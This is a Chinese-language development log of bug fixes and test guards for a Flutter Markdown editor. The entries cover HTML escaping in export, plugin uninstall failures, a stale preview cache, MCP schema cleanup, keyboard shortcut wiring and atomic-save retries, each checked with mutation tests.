## 加固：导出时的 HTML 转义，五条里两条没人按着

不是缺陷记录：`_escapeHtml` 是**对的**。但去掉 `&` 或 `"` 那一条，导出相关的
27 条测试全绿。

### 两种不同的坏法

**`&` 不转义**：读者写的 `AT&T` 原样输出。更要紧的是浏览器会把没转义的 `&`
当实体开头看待，读者文档里的字符变成标记。

**`"` 不转义**：`_escapeHtml` 的结果**用在属性里**（`title="${_escapeHtml(...)}"`，
1247 与 1258 行）。一个 `he said "hi"` 的链接标题会把属性提前关掉，
后面的内容成了浏览器自己解释的标记——导出的 HTML 文件里，这是注入面。

### 顺带确认了三道守卫是有效的

这一轮先问的是「守卫自己拦不拦得住」，对象是插件生态的对账链：

| 守卫 | 变异 | 结果 |
|---|---|---|
| SDK 的 `check.py`（三份实现一致） | 删 Lua 里一个函数 / 改坏示例 manifest | 都被抓 |
| `sdk_schema_agrees_test`（跨仓库：schema ↔ 编辑器权限） | 删一个权限 / 加一个编辑器不认的 | 都被抓 |
| `plugin_declares_what_it_uses_test`（插件只申请它用的） | 多申请一个 / 少申请一个 | 都被抓 |

**六次变异六次拦住**，整条链是端到端有效的。记下来是为了下次不必重做这六次。

### 一个顺带发现，没修

写测试时发现 `\&lt;`（反斜杠转义的 `&`）导出后浏览器画出 `<`，而读者写的是四个字符。
这属于 CommonMark「Backslash escapes」那一簇仍然失败的四例，不属于这里的转义规则。
**写下来而不是修**——它和本节要按住的东西不是一回事，混在一起会让两边都说不清。

### 一次被 assert 拦下的无效变异

变异「不转义 `'`」第一遍锚点没命中（shell 里的引号转义），`assert old in s` 当场报错。
没有它，我会把一次**根本没改动文件**的运行当成「守卫通过」。

### 涉及文件

`test/services/html_escape_test.dart`（新增）

---

## BUG-323：读不出来的插件删不掉（用户实机报告）

### 现象

读者反复看到插件页顶着一条红字：

```
com.sugarfatfree.ai-translate: a plugin cannot ship Dart source: use a .lua
or .js script, or compile it and ship the executable with runtime "process"
```

**他说「我把已安装的插件都删了也还是有这个错误」。**

### 根因：删得掉的都不是问题所在

通过应用自己的 MCP 服务连上他的 Windows 看了截图和状态：

- `get_state` 返回 `"plugins": []`——能读出来的插件确实一个都没有
- 截图里「已安装插件 / 尚未安装插件」，下面「INSTALLED BUT UNREADABLE」一条红字

卸载按钮长在**上面那张列表**上，而那张列表由「manifest 解析成功」的插件构成。
坏掉的那个没有条目、没有按钮——**读者唯一想删的那个，正是唯一删不掉的那个**。
他执行的「把已安装插件都删了」，用的正是那个碰不到它的机制。

### 修

红字那一行加删除按钮。接口不用改：`uninstall(id)` 删的是
`installDirectory/<id>`，而 `problems()` 报的 `directory` 就是那个 basename——
坏插件没有 manifest、也就没有 id，目录名是这里唯一能拿到的东西，
而它恰好正是需要的东西。

### 这条缺陷的形状

`_scan()` 的注释、BUG-278 的记录都说明「读不出来的插件要把原因说给读者」——
那一半做到了。**说了原因，没有给出路。** 一个只能看不能动的错误提示，
每次打开插件页都在那里。

---

## BUG-324：把 Dart 类名甩给读者

同一张截图的下半部分：

```
HttpException: marktext-plus-plugins/marktext-plus-plugin-sdk: GitHub is
rate-limiting searches from this machine; try again in 385 seconds.
```

冒号后面那句是**写给读者的**，冒号前面那个是写给堆栈的。面板用的是
`discovery.failed('$error')`。

而 `PluginManager._describe` 的注释早就写过这条：

> A `FormatException` prints as "FormatException: …" — the class name is noise
> to whoever is looking at a plugin that did not appear.

**学过一次，只用在了一个地方。** 现在是 `PluginCatalogService.describeError`，
一个具名函数，连 `SocketException` 也顺带说了人话（「连不上 GitHub，检查网络或代理」）。

### 顺带

「INSTALLED BUT UNREADABLE」和「Uninstall」是硬编码英文，而周围全是中文。
两个键补进 12 种语言。

### 涉及文件

`lib/ui/widgets/plugin_panel.dart`；`lib/services/plugin_catalog_service.dart`；
12 个 `.arb`；`test/ui/widgets/unreadable_plugin_removal_test.dart`（新增）；
`test/services/plugin_download_rules_test.dart`

---

## BUG-325：预览显示的不是当前文档

### 现象

通过 MCP 连上实机做自动化测试时撞到的。写入一份文档：

- 状态栏：**字符 673、段落 22**（内容确实进去了）
- 预览区：**「开始写点什么...」**（空文档的占位符）

切到源码视图——内容和高亮都正常。切回预览——这次画出来了。
然后**停在预览里再写一次**：

- 状态栏：**字符 40、段落 2**
- 预览区：**还是上一份 673 字符的文档**

也就是说，**同一个窗口的两个部分在互相矛盾，而且没有任何报错**。

### 根因

`_DeferredEditorBuilder`（home_screen 里的私有类）：

```dart
Widget? _cachedWidget;
void _startBuild() {
  if (_isBuilding || _cachedWidget != null) return;   // 一辈子只建一次
  _cachedWidget = widget.builder();                    // 闭包捕获了当时的 content
}
Widget build(_) => _cachedWidget ?? 骨架;
```

`builder` 是一个**闭包在文档文本上**的函数，而它只被调用一次。之后父组件带着新
content 重建、生成新闭包，`_startBuild` 却因为 `_cachedWidget != null` 直接返回。

**这一格从此显示的是「这一格第一次出现时」的那份文本。**

### 打字为什么没事，别的全中

打字走源码窗格自己的 `TextEditingController`，不经过这里。**不是打字产生的内容变化
全部中招**，而它们共用一个入口 `tabProvider.updateContent`：

| 路径 | 谁在用 |
|---|---|
| 插件 `replace` | AI 写作/纠错/翻译把结果写回文档——插件的核心功能 |
| 磁盘重载 | 文件在外部被改动后接受重新加载 |
| MCP `set_content` | 自动化 |

### 修

把这个类抽成 `lib/ui/widgets/deferred_editor_builder.dart` 里的公开组件
（私有类测不了），并且**只延迟第一次构建，不缓存结果**：

```dart
bool _ready = false;
Widget build(_) => _ready ? widget.builder() : 骨架;
```

「切走再切回来不转圈」是原来那份缓存唯一买到的东西——一个 `bool` 同样买得到。
真正的缓存在下面的渲染器里，它按 markdown 内容做键，**那一层才分得清有没有真的变过**。

### 四条测试

延迟首帧、内容改变要跟上、切回来不重新转圈、没轮到显示就不建。
变异（改回「建一次就留着」）只打掉第二条——一一对应。

### 怎么找到的

**用户报告插件页报错 → 连上实机 → 顺手做全量自动化测试 → 撞见这个。**
它比原本要查的问题严重得多，而且不是靠读代码找出来的：
读代码时 `_DeferredEditorBuilder` 看起来是个合理的性能优化。

### 涉及文件

`lib/ui/screens/home_screen.dart`；`lib/ui/widgets/deferred_editor_builder.dart`（新增）；
`test/ui/widgets/deferred_editor_builder_test.dart`（新增）

---

## BUG-326：源码窗格不认反斜杠转义

### 现象

MCP 实机测试时从截图里看出来的，再用探针精确对上：

| 输入 | 源码窗格画成 | 预览实际画出 |
|---|---|---|
| `\*不是斜体\*` | **斜体** | 字面星号 |
| `` \`不是代码\` `` | **代码色** | 字面反引号 |
| `价格 \$5 和 \$10` | **把「$5 和 \$」当公式** | 字面美元符号 |
| `\_也不是斜体\_` | **斜体** | 字面下划线 |

最后那条钱的例子尤其说明问题。`syntax_highlighter.dart` 的注释里写着那条美元规则
是从解析器抄来的，为的正是：

> The parser's own rule, so a line about money stays a line about money

**而人们写 `\$5` 恰恰就是为了表示钱。**

### 这个文件通篇都在讲「要和解析器一致」

- `_` 的规则：「the parser has always read both」
- 括号嵌套：「the same nesting the parser allows … so the two agree」
- flanking 规则：「The judgement comes from the parser's own rule, not a second copy of it」

**转义是它唯一没跟上的那条。**

### 修

加在 `_Pattern.accepts` 里——**那是每个模式已经都要经过的唯一一处**，flanking 规则
就在它下面几行。注释里写了理由：「a second place to refuse a match is a second
place to forget one」。

反斜杠按**奇偶**数：`\\*` 是一个转义过的反斜杠加一个活的星号，见一个就算转义会把
真强调误判掉。

### 变异暴露了三条不能失败的断言

这一个修复里，**我的断言被变异证伪了三次**：

| 变异 | 第一次 | 补了什么用例之后 |
|---|---|---|
| 不检查开头标记 | 0 条失败 | `\*只有开头转义*`（开头死、结尾活）|
| 反斜杠不分奇偶 | 0 条失败 | `C:\\*斜体*`（标记紧跟在双反斜杠后）|
| 不检查结尾标记 | 0 条失败 | `*只有结尾转义\*`（开头活、结尾死）|

第一版的「`\\` 不算转义」用的是 `C:\\ 然后 *斜体*`——**星号前面是空格**，
两种实现都一样，什么也没证明。三次都是同一个毛病：
**用例没有落在两种实现分歧的那个点上。**

### 涉及文件

`lib/ui/editor/syntax_highlighter.dart`；
`test/ui/editor/highlighter_honours_escapes_test.dart`（新增）

---

## BUG-327：激活一个不存在的标签，编辑器说「好了」

### 实机验证

```
control activate_tab "不存在的标签"  →  tab 不存在的标签 is active
get_state                            →  "activeTabId": "不存在的标签"
```

编辑器于是处在**顶上有标签页、下面什么都没有**的状态，而且没有任何报错。

### 根因

```dart
void setActiveTab(String id) {
  state = state.copyWith(activeTabId: id);   // 不问这个 id 是不是真的
}
```

标签栏只会递交它刚画出来的 id，所以这条一直没出事。**而 MCP 把同一个动作
开放给了任何能发 JSON 的东西。**

### 修

`setActiveTab` 返回 `bool`，不存在就什么都不做。MCP 那句回话改成由 provider 的
返回值决定——**调用方要能分辨「切过去了」和「没有这个标签」，之前这两件事说的是同一句话**。

`close_pane` 同样：没有打开的窗格也回报「已关闭」，现在说「没有打开的右窗格」。

---

## BUG-328：MCP 宣称了两个不存在的动作

`control` 的 schema 列了八个动作。其中 **`open_file` 和 `run_plugin_command`
在整个代码库里只出现在那个枚举里**——没有任何实现。

`mcp_provider.dart` 的 `default:` 分支写着：

> open_file and run_plugin_command need the widget layer, where they are wired up

**那里从来没有接过。** 这是本仓库第八次「写好了没接上」，而这次更糟：
**schema 对外宣称支持，客户端调了才发现是空的。**

实测：

```
control open_file           → action "open_file" is not available
control run_plugin_command  → action "run_plugin_command" is not available
```

### 处理：撤下，不是半接

从枚举里移除，并把两者各缺什么写进注释：

- **`open_file`**：把一个路径开进**这个**窗口的逻辑有 30 行，长在侧边栏的
  `_openFileInTab` 里。在 MCP 里再抄一份，正是本文档反复在消除的那个模式——
  诚实的第一步是把它提到 `TabNotifier` 上
- **`run_plugin_command`**：需要 `BuildContext`（窗格、卡片、提示条都从它来），
  得由 widget 层向这里注册一个处理器

**一个宣称了客户端用不了的动作的 schema，比不提它更糟。** 接上它们值得做，
但那是一次功能改动，草率复制只会造出重复规则。

### 顺带说明

这也是「用 MCP 测插件功能」做不到的真正原因——不只是机器上没装插件，
**那个动作本身不存在**。

### 涉及文件

`lib/providers/tab_provider.dart`；`lib/providers/plugin_provider.dart`；
`lib/providers/mcp_provider.dart`；`lib/services/mcp_tools.dart`；
`test/providers/tab_activation_test.dart`（新增）

---

## BUG-329：改了名单没改说明，而名单本来就不该有两份

BUG-328 把 `open_file` 和 `run_plugin_command` 从枚举里删了。**同一个文件里另外三处还在宣传它们**：

```dart
description: 'Drive the editor: open a file, switch tabs, change the view '
             'mode, run a plugin command, close a pane.',   // 还在承诺
...
'pluginId': {'type': 'string'},   // 只服务 run_plugin_command
'command':  {'type': 'string'},   // 同上，现在没有任何读取者
```

**description 比 enum 更容易被信**——它是给人读的那一句。这是本文档反复在写的
那个模式：一条规则抄了好几份，其中一份没跟上。

### 修法不是把三处逐个改对

逐个改对，下次还会漏。**根子在于「agent 看到的名单」和「编辑器实现的名单」
是两份手写清单**，谁也不检查谁。

现在只有一份：

```dart
enum McpAction {
  newTab('new_tab'), closeTab('close_tab'), activateTab('activate_tab'),
  setViewMode('set_view_mode'), setContent('set_content'), closePane('close_pane');
}
```

schema 从 `McpAction.values` 生成，`_perform` 对同一个类型做穷尽 switch。
加一个动作而不实现它，**代码编译不过**：

```
error - mcp_provider.dart:152 - The type 'McpAction' isn't exhaustively matched
        by the switch cases since it doesn't match the pattern 'McpAction.openFile'
```

这条错误是实测出来的，不是设想的。

### 顺带修正的两处措辞

- `path` 改名了？没有——但它的说明写清了「**这只是标签名，不会去读那个文件**，
  正文请用 `content` 传」。它叫 path 而只当名字用，是会让调用方等一场空的那种命名
- `tabId` 说明了哪些动作允许省略（默认当前标签）

### 涉及文件

`lib/services/mcp_tools.dart`；`lib/providers/mcp_provider.dart`；
`test/services/mcp_action_test.dart`（新增，5 条）

### 验证

三个变异各自被一条测试挡住：schema 硬编码回旧列表、把 `pluginId` 加回来、
描述改回旧措辞。第四种破坏（往 enum 加动作）由编译器挡。

---

## BUG-330：十一个快捷键是画上去的

### 现象

打开「设置 → 快捷键」，里面列着 56 个可重绑的动作。其中十一个，**改了键也没用，用默认键也没用**：

| 动作 | 菜单里画的键 |
|------|-------------|
| `zoomIn` / `zoomOut` / `resetZoom` | Ctrl+= / Ctrl+- / Ctrl+0 |
| `typewriterMode` | 打字机模式 |
| `fullScreen` | F11 |
| `print` | Ctrl+P |
| `exportPdf` | 导出 PDF |
| `settings` | Ctrl+, |
| `newWindow` | Ctrl+Shift+N |
| `quit` | Ctrl+Q |
| `reloadImages` | 重新加载图片 |

菜单项旁边端端正正写着快捷键，按下去什么都不发生。点菜单项本身是好的。

### 根因：三份名单，只有一份是全的

`_runShortcut` 自己的注释里就写着病因：

> Flutter's MenuItemButton.shortcut only *displays* a shortcut — "shortcuts are
> not automatically handled", per its own documentation — so every shortcut in
> the menus was decorative.

诊断是对的，**修的时候只修了一半**。当时把 find/save/open/视图模式等十四个补进了
`_runShortcut` 的 switch，同一批菜单里的 zoom、打字机、全屏没跟上。于是有三份名单：

| 名单 | 内容 | 是否完整 |
|------|------|---------|
| `KeybindingService.defaultKeybindings` | 56 个，设置界面照它画 | 完整 |
| `_runShortcut` 的 switch | 14 个 | 缺 11 个 |
| 各菜单项的 `onPressed` | 各写各的 | 与前两者无关 |

**没有任何东西比较过这三份。** 这正是本文档反复出现的那条：
一条规则抄了好几份，其中一份没跟上。

### 修法

一份名单，三处都读它：`lib/ui/widgets/window_actions.dart`。

```dart
class WindowAction {
  const WindowAction(this.name, this.run);
  final String name;
  final void Function(BuildContext, WidgetRef) run;
}
```

- `_runShortcut` 从 switch 变成 `WindowActions.byName(action)?.run(...)`
- 菜单的 `onPressed` 改为调同一个条目（zoom 的 clamp 原本内联了两份，现在一份；
  设置页的转场动画原本写在菜单项里，现在是 `WindowActions.openSettings`）
- 编辑类动作不在这里：它们按名字匹配 `FormatAction`，由源码编辑器执行，
  这样 Ctrl+A 在查找框里仍然属于查找框

### 守卫

`test/ui/window_action_coverage_test.dart` 两个方向都查：

- 每个可绑定的名字，都能被 `WindowActions` / `FormatAction` / undo-redo 之一接住
- `WindowActions` 里的每个名字，设置界面都能绑到

变异验证：删掉那十一条 → 两条测试红；只删 `zoomIn` 一条 → 照样红。

### 顺带

`_exportPdf` / `_print` / `_newWindow` / `_toggleFullScreen` 改为公开的
`exportPdf` / `printDocument` / `newWindow` / `toggleFullScreen`——快捷键要调它们。
`export_failure_test` 硬编码了旧名字因此变红，这是**守卫设计正确的表现**
（改名让它失败，而不是静默放行），改名单即可。

### 涉及文件

`lib/ui/widgets/window_actions.dart`（新增）；`lib/ui/widgets/app_menu_bar.dart`；
`lib/ui/screens/home_screen.dart`；`test/ui/window_action_coverage_test.dart`（新增，4 条）；
`test/ui/widgets/export_failure_test.dart`

---

## BUG-331：schema 的守卫建了三条，它自己有六条约束

`sdk_schema_agrees_test` 是为对账 SDK schema 与编辑器而建的——它的文档注释
说得很清楚：作者照 schema 写 manifest，schema 和编辑器不一致，
**被误导的正是那份本该帮他的文件**。

建的时候盖了三个枚举：`permissions`、`runtime`、`settings.type`。
同一个 schema 文件里还有：

| 约束 | 当时有守卫吗 |
|------|-------------|
| `permissions` 枚举（18 个） | 有 |
| `runtime` 枚举（4 个） | 有 |
| `settings.type` 枚举（4 个） | 有 |
| **`menus.when` 枚举（3 个）** | **没有** |
| **`allOf`：`process` → 必须有 `entrypoints`** | **没有** |
| **`allOf`：`lua`/`js` → 必须有 `entrypoint`** | **没有** |

**三份都对齐着**——查过了，今天没有任何一处不一致。补的是守卫，不是修复。

### 为什么 `when` 值得守

未知的 `when` 值**回落到 `always`**。所以 schema 允许而编辑器不认的条件，
表现是「这条命令在不该出现的地方出现了」，不是拒绝安装。静默且错误。

### 两条条件约束放在别处

它们检查的是编辑器拒不拒绝，只调 `PluginManifest.fromJson`，
**不需要 SDK 仓库在场**，所以放进 `plugin_manifest_test`——
`repo_dependent_tests_test` 那条守卫抓到了这一点：

```
test/services/sdk_schema_agrees_test.dart: 6 个用例，只有 4 个带 skip
```

它是对的。那个文件的每个用例都该在 SDK 缺席时跳过，而这两条在 CI 上也能跑，
放进去会让「跳过」变成谎话。

### 验证

三个变异各被一条挡住：schema 的 `when` 多一个值、编辑器不再要求 `entrypoint`、
编辑器不再要求 `entrypoints`。

### 涉及文件

`test/services/sdk_schema_agrees_test.dart`；`test/services/plugin_manifest_test.dart`

---

## BUG-332：同一个动作，两个名字

### 现象

| 语言 | 动作 | 命令面板显示 | 设置的快捷键列表显示 |
|------|------|-------------|--------------------|
| 简体中文 | `mathBlock` | 数学公式 | 数学公式**块** |
| Русский | `strikethrough` | Зачеркнутый | Зач**ё**ркнутый |

中文那处会真的让人困惑：菜单里还有一项叫「行内公式」，
`mathBlock` 是它的块级同伴。**叫「数学公式」读不出它和行内那个的分别**，
而旁边的 `codeBlock` 一直叫「代码块」。

俄语那处是正字法：`ё` 不该省。

### 根因

同一批动作在 ARB 里被命名了**两次**：

- `format*` / `edit*` —— 菜单、格式工具栏、斜杠菜单、命令面板读它
- `keybinding*` —— 设置的快捷键列表读它

十八个动作两边都有键，**没有任何东西把它们绑在一起**。改了一边，
另一边留在原地，同一条命令就有了两个名字。

发现方式：FEAT-130 把设置界面那份译名映射提为 `actionLabel` 供命令面板共用，
于是两份映射第一次落在同一个视野里——逐语言比对 18 × 12 = 216 对，
其中 2 对不一致。

### 修

统一到更准确的说法：`formatMathBlock` 改为「数学公式块」（与「代码块」
「行内公式」的构词一致），`formatStrikethrough` 补上 ё。

**重复本身没有消除**：那要从 12 个文件里删键并改写每个读者，
比问题本身更大。守卫直接盯住会伤到读者的那一面。

### 守卫

`test/core/i18n/one_action_one_name_test.dart`：每个动作的两个键，
在 12 种语言里译文必须一致。

**键对不是写在测试里的**——第一版写了 18 对，那本身就是这份对应关系的第三份
手写清单，正是本条要抓的形状。现在从两个映射里读出来：
`action_labels.dart` 给出「动作 → keybinding 键」，`home_screen.dart` 的
`formatLabels` 给出「动作 → format 键」，两边都有且键不同的就是一对。
带参数的跳过（`formatHeading(1)` 与 `keybindingHeading1` 是同一个名字的两种写法，
比较它们等于拿模板比结果）。

还有一条「守卫的守卫」：两个映射各自要读到足够多的条目，且确实数到 12 个文件。
**一个不再匹配的正则，或一个匹配不到文件的 glob，会让下面每条断言都静悄悄通过。**

变异验证四次：中文改回不一致 → 红；改一个从没出过问题的语言（韩语、德语）→ 红；
把正则改成匹配不到任何东西 → 被守卫的守卫抓住。

### 顺带扫到的

按「12 种语言译文全同」扫描 365 个键，得到 31 组同义键，其中
`fileSave` / `save` / `keybindingSave` / `commandSave` 是**同一个词四个键**。
**没有一并绑定**：译文相同不等于必须永远相同——`editCopy`（复制文本）与
`settingsMcpCopy`（复制 MCP 配置）碰巧都是「复制」，语境不同，将来分化是合理的。
守卫只盯**同一个动作**的那些。

### 涉及文件

`lib/core/i18n/l10n/app_zh.arb`、`app_ru.arb` 及其生成文件；
`test/core/i18n/one_action_one_name_test.dart`（新增）

---

## BUG-333：守卫承诺了它做不到的事

`export_failure_test` 里那条「每个导出入口都报告它调了什么」，注释写着：

> It covers an export added later, which is the case that would otherwise
> repeat this bug.

**它做不到。** 它的入口点是手写的四个名字：

```dart
for (final entry in ['_exportHtml', 'exportPdf', '_exportWord', 'printDocument'])
```

明年加一个 `_exportEpub`，不在这四个里，守卫一句话都不会说。
而那条注释会让下一个人以为已经查过了——**这比没有守卫更糟**，
因为「有没有人对过账」这个问题会因为它的存在而被答成「有」。

这是 BUG-332 那条守卫的同一个毛病（第一版也是手写 18 对），
也是 [[a-test-name-can-be-a-decision]] 记的那半：**名字承诺了一件它没做的事**。

### 修

守卫自己去找入口点：

```dart
final handlers = RegExp(
  r'(?:static )?void (\w*(?:[Ee]xport|[Pp]rint)\w*)\(WidgetRef',
).allMatches(source).map((m) => m.group(1)!).toList();
```

判据是「名字与导出或打印有关，且接收 `ref`」——那正是 File 菜单背后每个处理器的
形状。`_exportTitle` 这类返回字符串的 helper 不收 `ref`，不会被误纳。

后面跟一句 `containsAll([...四个已知的...])`：**一个不再匹配的正则会让循环
一次也不执行，而空循环里的每条断言都是通过的。**

### 验证

- **新增一个不报告失败的 `_exportEpub`** → 红。这正是旧清单会放行的那种改动
- **把正则改成匹配不到任何东西** → 被 `containsAll` 那句抓住

### 涉及文件

`test/ui/widgets/export_failure_test.dart`

---

## BUG-334：写在注释里的性能承诺

`main.dart` 在 `runApp` 之前 await 这一句：

```dart
await PluginManager(p.join(configDir, 'plugins')).reapOrphanedPlugins();
```

它回收上次崩溃遗留的插件进程。`reapOrphans` 里有一段注释：

> The usual case is a clean shutdown with nothing to reap, and the editor
> starts in under a second: **this must cost one existence check, not a write.**

实现是对的——没有记录就 early return。**但没有任何测试盯着它。**

去掉那行 early return，或者把 `_write(const [])` 提到前面，
**首帧之前就多了一次磁盘写，而八条已有测试全部照样绿。**

这是「约定要做进设施而非文档」的又一例：注释说清了意图，
挡不住下一个人。用户对这个编辑器的第一条要求是「秒启动」，
而守着它的只有一句话。

### 守卫

`plugin_process_registry_test` 加两条，两个方向：

1. **干净启动不写盘**：没有记录时，不问任何 pid、不杀任何东西、
   registry 文件在跑完之后仍然不存在
2. **有东西要回收时确实写回**：便宜的路径之所以便宜，必须是因为没事可做，
   而不是因为它不做事了

### 变异验证

- 删掉 `if (recorded.isEmpty) return 0;` → 第 1 条红
- 删掉 `await _write(const []);` → 第 2 条红（以及已有的「清空」那条）

### 涉及文件

`test/services/plugin_process_registry_test.dart`

---

## BUG-335：三行 `_index = null;`，删掉哪一行都没人吭声

`actionForEvent` 从一张反向索引里查答案，这张索引**建一次、留着**——
每次按键都要走这里，遍历 62 条绑定表是不能接受的。

三个地方负责让它失效：

| 位置 | 时机 |
|------|------|
| `setKeybinding` | 用户在设置里改了一个键 |
| `resetToDefaults` | 用户点了「恢复默认」 |
| `load` | 启动时从磁盘读入自定义绑定 |

**把其中任何一行 `_index = null;` 注释掉，全部 2730 条测试仍然全绿。**
三次变异，三次全绿。

### 那样会怎样

用户在设置里把「加粗」改成 Ctrl+Shift+B：

- 菜单里那一项**会显示新键**（`activatorFor` 直接读绑定表，不走索引）
- **按下去没反应**，而旧的 Ctrl+B 照样加粗

也就是 BUG-330 那种「界面说一套、按下去另一套」，只是这次由缓存造成。

### 为什么已有测试抓不到

`rebinding` 那一组三条测试，问的都是**菜单会显示什么**：

```dart
test('changing a binding changes what the menu shows', () {
  service.setKeybinding('bold', 'Ctrl+Shift+B');
  final bold = service.activatorFor('bold', isMacOS: false)!;   // ← 不走索引
```

名字是诚实的（「what the menu shows」），**但没有任何一条问「按下去会怎样」**。

### 测得了吗——功能键是那把钥匙

`actionForEvent` 那一组的注释解释了它为什么只测了两条边角：

> The modifiers come from HardwareKeyboard, which a unit test cannot press

**功能键不需要修饰键。** F3 默认绑 findNext，F5 绑 reloadImages，
F7/F8/F9 空着——单元测试可以完整走一遍索引。

### 守卫

五条，第一条先证明索引确实在被查（否则后面四条可能是在一个永远返回 null 的
索引上通过的）：

1. `actionForEvent(F3)` → `findNext`
2. 改绑之后，新键触发新动作
3. 改绑之后，**旧键不再触发**
4. 恢复默认之后，默认键回来
5. 从磁盘 load 之后，磁盘上的绑定生效

三次变异，一对一：改 `setKeybinding` → 第 2、3 条红；改 `resetToDefaults` →
第 4 条红；改 `load` → 第 5 条红。

### 涉及文件

`test/services/keybinding_service_test.dart`

---

## BUG-336：修好了，注释记下了，然后没人看着它

沿着 BUG-335 的查法把其余缓存过了一遍：

| 缓存 | 键 | 结论 |
|------|-----|------|
| `code_highlighting._cache` | `语言 + \0 + 代码` | **内容寻址**，不需要失效，安全 |
| `er_diagram_layout._cache` | 图元 id，随图重建 | 安全 |
| `export_service._cachedFontFallbacks` | 进程级字体，不随文档变 | 安全 |
| `markdown_renderer._cachedMarkdown` | **只有文本** | 见下 |

预览把解析结果存在 `_cachedMarkdown` 上，键只有文本。
而**行内 HTML 那个开关会改变同一段文本的读法**，所以开关变化时必须弃掉缓存。
代码做了，旁边还留着当年的现象：

> without this the preview kept the old rendering until the next keystroke

**把那一行注释掉，2736 条测试仍然全绿。** 一个修好的 bug，没有守卫，
下一次重构就会原样回来。

### 守卫

`test/ui/editor/html_setting_updates_preview_test.dart`：
`press <kbd>Esc</kbd> to stop` 这段源文，关着 HTML 时画出字面的 `<kbd>`，
开着时画成标记——**同一段文本自己说出它是按哪种读法解析的**。

照 `code_font_updates_preview_test`（BUG-316 的守卫）的模式写：固定次数 `pump`
而不是 `pumpAndSettle`（预览用 post-frame 回调分批填充，永远不会静下来），
改设置那句不 `await`（状态是同步变的，await 的是磁盘写，
在 widget test 的 FakeAsync 时区里永不完成）。

起点先断言一次「关着的时候确实画出了 `<kbd>`」——否则后面测的是别的东西。

### 变异验证

- 注释掉 `_cachedMarkdown = null;` → 红（正是原缺陷）
- 整个 `if` 块删掉（连解析器也不换）→ 红

### 涉及文件

`test/ui/editor/html_setting_updates_preview_test.dart`（新增）

---

## BUG-337：一个断言，同时挡住了缺陷和守卫

沿 BUG-336 的线索（注释里记着当年怎么坏的）继续查，`split_editor.dart` 有这一条：

> Without this the preview pane was read-only in split mode: task-list
> checkboxes did nothing and a block could not be edited in place,
> unlike in preview mode.

**把那个 `onSourceChanged:` 参数拿掉，2736 条测试全绿。** 又一个修好而无人看守的。

### 于是要补守卫，一写就撞上第二个缺陷

```
Tried to modify a provider while the widget tree was building.

#1  EditorNotifier.updateCursor        (editor_provider.dart:362)
#2  _SourceEditorState._onSelectionChanged (source_editor.dart:1288)
#10 HighlightingController.value=      (highlighting_controller.dart:51)
#11 _SourceEditorState.didUpdateWidget (source_editor.dart:707)
```

完整链路，**每一步都是真实使用路径**：

1. 在分屏的预览半边勾一个复选框
2. `_onPreviewEdited` → `_externalRevision++`
3. 源码半边的 `didUpdateWidget` 看到修订号变了，把新文本写进 controller
4. controller 通知它的两个 listener
5. `_onSelectionChanged` → `ref.read(editorProvider.notifier).updateCursor(...)`

第 5 步发生在 `didUpdateWidget` 里，**Riverpod 明确禁止在 widget 生命周期里改
provider**。debug 构建抛断言；release 里断言不生效，但 Riverpod 警告的
「两个监听同一 provider 的组件收到不同状态」是真实风险。

**这也解释了这个功能为什么一直没有守卫**：widget test 跑在 debug 下，
任何针对「分屏预览编辑」的测试，一写就抛。缺陷把自己的守卫挡在门外。

### 修

同一个文件的 `initState` 早就有正确做法——它用 `addPostFrameCallback`
推迟自己的第一次 provider 写入。`didUpdateWidget` 没跟上。

现在赋值前摘掉两个 listener，赋完加回来，然后在帧后手动调一次：

```dart
_controller.removeListener(_onTextChanged);
_controller.removeListener(_onSelectionChanged);
_controller.value = TextEditingValue(...);
_controller.addListener(_onTextChanged);
_controller.addListener(_onSelectionChanged);
WidgetsBinding.instance.addPostFrameCallback((_) {
  if (!mounted) return;
  _onTextChanged();
  _onSelectionChanged();
});
```

**文本不延迟**（源码窗格当帧就显示新内容），只有 provider 的通知落到帧后。

### 守卫

`test/ui/editor/split_preview_is_editable_test.dart`：在分屏里点复选框，
断言两件事——

1. 文档被写回（`- [x] 一`）
2. **`canUndo` 为真**：帧后那两句如果不跑，源码窗格拿着新文本而编辑器状态
   毫不知情，状态栏停在旧位置，而且这一勾没进历史——**Ctrl+Z 会越过它，
   退到读者从没待过的地方**

### 变异验证

| 变异 | 结果 |
|------|------|
| 拿掉 `onSourceChanged:`（预览重回只读） | 红 |
| 把生命周期违规改回去 | 红（抛断言） |
| 帧后不再调那两个 handler | 红（`canUndo` 为假） |

### 涉及文件

`lib/ui/editor/source_editor.dart`；
`test/ui/editor/split_preview_is_editable_test.dart`（新增）

---

## BUG-338：Windows 上救命的那三行，没人看着

原子保存的最后一步是把临时文件改名到目标位置。`_renameWithRetry` 旁边写着：

> On Windows a virus scanner routinely holds a newly written file open for a
> few dozen milliseconds, and the rename fails with a sharing violation that
> is gone by the next attempt. **Without this the atomic save would be *less*
> reliable than the truncating write it replaces.**

**把重试删掉，2737 条测试全绿。** `file_service_atomic_save_test` 那十条查的是
原子性——失败不破坏原文件、不留临时文件——**没有一条查重试**。

原因也很实在：**这台机器上没有杀毒软件，占用是造不出来的。**

### 让它造得出来

`renameWithRetry` 现在接收改名动作与等待动作（`@visibleForTesting`，
与 `PluginCatalogService.refuseInsecureDownload` 同一个先例）。生产行为不变——
两个参数都为 null 时就是原来的 `rename` 和 `Future.delayed`。

### 守卫（4 条）

1. 第二次成功 → 保存成功，且**中间真的等过**（立刻重试等于没等占用放开）
2. 第三次成功 → 保存成功
3. 一直被占用 → **报错，而不是无限重试**；恰好试三次
4. **两次等待递增**（20ms、60ms）：两次等一样久，第二次多半撞在同一个占用上

### 变异验证

| 变异 | 结果 |
|------|------|
| 第一次失败就抛（删掉重试） | 4 条全红 |
| 把上限改成 9999（占用不放就挂死） | 第 3 条红 |
| 两次都等 20ms | 第 4 条红 |

### 涉及文件

`lib/services/file_service.dart`；`test/services/save_retries_a_locked_file_test.dart`（新增）

---

## BUG-339：没问到人，却说「已是最新版本」

`UpdateService.checkForUpdate` 特意把「有没有问到」和「问到了什么」分开返回：

```dart
static Future<({UpdateInfo? update, bool reachable})> checkForUpdate(...)
```

注释说明了理由：

> the automatic check on startup wants to stay quiet when the network is down,
> but **a check the user asked for must not answer "you are on the latest
> version" when it never got an answer**

菜单里那段代码**读了** `result.reachable`，做得对。**但没有守卫**：
把那句判断去掉，让它无条件说「已是最新版本」，2741 条测试全绿。
火车上断网的读者会被告知他是最新版，而编辑器根本没问过任何人。

这是 CLAUDE.md 里那条视角的又一例：**编辑器说了与事实不符的话。**

### 为什么之前守不了

那句话是在 `ScaffoldMessenger.showSnackBar` 里现算的，
要测它就得起一个 widget、mock 掉网络。

